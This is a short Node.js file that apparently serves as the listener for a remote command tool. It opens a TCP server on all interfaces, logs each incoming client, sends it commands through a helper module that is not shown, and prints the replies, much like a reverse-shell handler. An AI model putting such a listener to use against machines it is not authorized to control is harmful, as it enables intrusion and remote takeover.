"use strict";
const net = require("net");
const util = require("./utils.js");
const sendClientCount = require("./ws_server.js");
const port = 11111;
const server = net.createServer((client) => {
    client.on("error", (error) => {
        switch (error.code) {
            case "ECONNRESET":
                console.log("\[-] Client disconnected!");
                util.getClientCount(server);
                break;
            default:
                break;
        }
    });
});

server.listen({
   host : "0.0.0.0",
   port,
},() => {
    console.log("Socket server listening on", server.address().address, port);
});

server.on("connection", (client) => {
    util.getClientCount(server);
    console.log(`[+] Connection receieved: ${client.remoteAddress}:${client.address().port}`);
    util.takeAndSendCommand(client);

        client.on("data", (data) =>  {
            console.log(data.bytesRead);
            console.log("Data",data.toString());
            util.takeAndSendCommand(client);
    });
});

module.exports = server;